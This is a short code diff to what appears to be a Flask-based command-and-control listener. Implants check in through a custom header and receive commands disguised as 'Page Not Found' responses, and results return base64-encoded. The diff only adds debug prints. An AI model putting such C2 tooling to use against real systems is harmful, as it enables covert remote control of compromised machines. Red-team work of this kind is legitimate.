@@ -44,7 +44,9 @@ def Stager():
 def ImplantCheckIn():
     # Should check ANY connection in against all configured implant options (IE body, header etc)
     #   unlike they 'headers' options which is configured in the current iteration.
+    print("Checkin proto: ", app.config['listener_type'])
     if 'X-Implant' in request.headers:
+
         db.Update_ImplantLastCheckIn(request.headers['X-Implant'])
         CmdToExecute = Imp.IssueCommand(request.headers['X-Implant'])
         Resp = make_response("Page Not Found.")
@@ -54,11 +56,13 @@ def ImplantCheckIn():
     else:
         Resp = make_response("Page Not Found")
         Resp.headers["X-Command"] = "=="
+    print(Resp.headers["X-Command"])
     return Resp
 
 @app.route("/help",methods=['GET','POST'])
 def ImplantCommandResult():
     if "X-Result" in request.headers:
+        print(request.headers)
         # -- X-Result is a placeholder header and should be changed to a more realistic value
         DecodedResponse = base64.b64decode(request.headers["X-Result"]).decode('utf-16')
         Imp.CommandResponse(DecodedResponse, app.config['listener_type'])
